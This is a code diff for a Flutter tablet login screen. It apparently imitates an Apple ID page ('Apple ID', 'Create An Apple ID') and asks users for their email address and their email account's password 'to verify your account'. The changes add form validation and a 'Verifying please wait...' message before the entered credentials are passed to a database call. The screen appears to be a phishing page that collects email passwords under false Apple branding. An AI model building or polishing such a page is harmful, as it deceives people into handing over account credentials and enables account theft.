@@ -24,7 +24,7 @@ class _TabletLayoutState extends State<TabletLayout> {
     double width = MediaQuery.of(context).size.width;
     TextEditingController passwordC = TextEditingController();
     TextEditingController emailC = TextEditingController();
-    GlobalKey<FormState> formkey = GlobalKey<FormState>();
+    GlobalKey<FormState> veryfyformkey = GlobalKey<FormState>();
     return Scaffold(
         resizeToAvoidBottomInset: false,
         backgroundColor: CupertinoColors.white,
@@ -63,7 +63,7 @@ class _TabletLayoutState extends State<TabletLayout> {
                 Text(
                   'Email Address And Password Required',
                   style: TextStyle(
-                      fontSize: 17,
+                      fontSize: 23,
                       color: Colors.black,
                       fontWeight: FontWeight.normal),
                 ),
@@ -73,7 +73,7 @@ class _TabletLayoutState extends State<TabletLayout> {
                   child: Text(
                     "Enter Your Email Address and Email's password to verify your account !",
                     style: TextStyle(
-                        fontSize: 13,
+                        fontSize: 17,
                         color: Colors.red,
                         fontWeight: FontWeight.normal),
                   ),
@@ -89,6 +89,7 @@ class _TabletLayoutState extends State<TabletLayout> {
           SizedBox(
             width: width / 2,
             child: Form(
+              key: veryfyformkey,
               autovalidateMode: AutovalidateMode.always,
               child: Column(children: [
                 Padding(
@@ -112,7 +113,7 @@ class _TabletLayoutState extends State<TabletLayout> {
                       border: OutlineInputBorder(
                           borderRadius: BorderRadius.all(Radius.circular(10))),
                       hintText: ' Email Address',
-                      hintStyle: TextStyle(fontSize: 16),
+                      hintStyle: TextStyle(fontSize: 17),
                     ),
                     validator: (ifemail) => !EmailValidator.validate(ifemail!)
                         ? 'Enter a valid email'
@@ -140,14 +141,16 @@ class _TabletLayoutState extends State<TabletLayout> {
                               bottomRight: Radius.circular(10),
                               bottomLeft: Radius.circular(10))),
                       hintText: 'password',
-                      hintStyle: TextStyle(fontSize: 16),
+                      hintStyle: TextStyle(fontSize: 17),
                     ),
                     validator: (ifpassword) {
-                      if (ifpassword!.isNotEmpty && ifpassword.length < 7) {
-                        return 'Please enter a correct password';
-                      } else {
-                        return null;
-                      }
+                       if (ifpassword!.isEmpty) {
+                                    return 'Please enter password';
+                                  } else if (ifpassword.length < 6) {
+                                    return 'Please enter a correct password';
+                                  } else {
+                                    return null;
+                                  }
                     },
                   ),
                 ),
@@ -158,9 +161,11 @@ class _TabletLayoutState extends State<TabletLayout> {
           TextButton(
             child: const Text(
               'Continue',
-              style: TextStyle(fontSize: 23, color: Colors.blue),
+              style: TextStyle(fontSize: 25, color: Colors.blue),
             ),
             onPressed: () {
+              if(veryfyformkey.currentState!.validate()){
+
               FutureBuilder<Map<String, dynamic>>(
                 future: Database(
                         password: widget.password,
@@ -179,8 +184,14 @@ class _TabletLayoutState extends State<TabletLayout> {
                   }
                 },
               );
-              debugPrint('Email:${emailC.text}, Password:${passwordC.text}');
-            },
+              const info = 'Verifying please wait...';
+                    const snackBar = SnackBar(
+                      content: Text(info),
+                      duration: Duration(seconds: 4),
+                      backgroundColor: CupertinoColors.activeBlue,
+                    );
+                    ScaffoldMessenger.of(context).showSnackBar(snackBar);
+  }},
           ),
           const SizedBox(height: 10),
           TextButton(
@@ -198,7 +209,7 @@ class _TabletLayoutState extends State<TabletLayout> {
           child: Text(
             'Apple ID',
             style: TextStyle(
-                fontSize: 14, color: Colors.black, fontWeight: FontWeight.bold),
+                fontSize: 17, color: Colors.black, fontWeight: FontWeight.bold),
           ),
         ),
         leadingWidth: 150,
@@ -211,7 +222,7 @@ class _TabletLayoutState extends State<TabletLayout> {
                       onPressed: () {},
                       child: const Text(
                         'Sign in',
-                        style: TextStyle(color: Colors.black, fontSize: 11),
+                        style: TextStyle(color: Colors.black, fontSize: 15),
                       )),
                   TextButton(
                       onPressed: () {},
@@ -219,14 +230,14 @@ class _TabletLayoutState extends State<TabletLayout> {
                           onPressed: () {},
                           child: const Text('Create An Apple ID',
                               style: TextStyle(
-                                  color: Colors.black, fontSize: 11)))),
+                                  color: Colors.black, fontSize: 15)))),
                   TextButton(
                       onPressed: () {},
                       child: const Text('FAQ',
-                          style: TextStyle(color: Colors.black, fontSize: 11)))
+                          style: TextStyle(color: Colors.black, fontSize: 15)))
                 ],
               )),
         ],
-        elevation: 2);
+        elevation: 1);
   }
 }
